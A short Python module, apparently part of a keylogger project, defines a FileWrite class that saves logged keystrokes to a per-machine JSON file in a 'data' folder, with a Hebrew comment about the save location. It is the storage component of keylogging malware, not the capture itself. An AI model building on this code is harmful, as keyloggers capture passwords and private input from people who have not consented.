import json
import os
from Ikeylogger import IWriter

# --הגדרת מיקום שמירת הקובץ--
os.chdir(os.getcwd() + "\\data")


class FileWrite(IWriter):
    def __init__(self):
        self.keys = []

    def send_data(self, data, machine_name):
        with open(f"{machine_name}.json", "w") as file:
            for key in data:
                self.keys.append(key)

            json.dump(self.keys, file)